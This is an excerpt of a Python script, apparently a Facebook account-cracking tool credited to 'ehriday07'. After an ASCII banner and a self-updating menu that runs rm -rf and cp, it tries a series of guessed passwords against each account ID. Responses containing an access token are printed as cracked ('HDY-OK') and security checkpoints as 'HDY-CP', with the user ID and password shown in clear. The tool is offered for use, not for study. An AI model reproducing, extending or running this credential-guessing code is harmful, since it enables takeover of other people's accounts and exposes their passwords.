...
#AUTHOR : ehriday07 (hridaychaudhary)

#OPEN SOURCE :)

#DON'T FORGET TO GIVE CREDIT TO MR. hriday 
...
def logo():
	...
	os.system('echo "\n
     ...
     .u    `888E        .d88B :@8c     .    '*88888bu         u     9888i   .dL  

  ud8888.   888E .z8k  ="8888f8888r  .@88u    ^"*8888N     us888u.  `Y888k:*888. 

:888'8888.  888E~?888L   4888>'88"  ''888E`  beWE "888L .@88 "8888"   888E  888I 

d888 '88%"  888E  888E   4888> '      888E   888E  888E 9888  9888    888E  888I 

8888.+"     888E  888E   4888>        888E   888E  888E 9888  9888    888E  888I 

8888L       888E  888E  .d888L .+     888E   888E  888F 9888  9888    888E  888I 

'8888c. .+  888E  888E  ^"8888*"      888&  .888N..888  9888  9888   x888N><888' 

 "88888%   m888N= 888>     "Y"        R888"  `"888*""   "888*""888"   "88"  888  
...
def main():
	...
	print("\033[96;1m  [F] FLOW ehriday plus \033[92;1m✘\033[91;1m✘")
...
def log_sel():
	...
	if sel == "":
		...
		try:
			...
			os.system("rm -rf ehriday.py")

			os.system("cp -f ehriday/ehriday.py \\.")

			os.system("rm -rf ehriday")
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				print(" \033[1;32m[HDY-OK] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in data.json()['error_msg']:
					...
					print(" \033[1;33m[HDY-CP] "+uid+" | "+pass1+"\033[0;97m")
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													if "access_token" in data.text and "EAAA" in data.text:
														...
														print(" \033[1;32m[HDY-OK] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in data.json()['error_msg']:
															...
															print(" \033[1;33m[HDY-CP] "+uid+" | "+pass6+"\033[0;97m")
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	...
																	if "access_token" in data.text and "EAAA" in data.text:
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			...
																			print(" \033[1;33m[HDY-CP] "+uid+" | "+pass8+"\033[0;97m")
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				if "www.facebook.com" in data.json()['error_msg']:
					...
					if "access_token" in data.text and "EAAA" in data.text:
						...
						print(" \033[1;32m[HDY-OK] "+uid+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in data.json()['error_msg']:
							...
							print(" \033[1;33m[HDY-CP] "+uid+" | "+pass2+"\033[0;97m")
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								print(" \033[1;32m[HDY-OK] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in data.json()['error_msg']:
									...
									print(" \033[1;33m[HDY-CP] "+uid+" | "+pass3+"\033[0;97m")
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										print(" \033[1;32m[HDY-OK] "+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in data.json()['error_msg']:
											...
											print(" \033[1;33m[HDY-CP] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												print(" \033[1;32m[HDY-OK] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													print(" \033[1;33m[HDY-CP] "+uid+" | "+pass5+"\033[0;97m")
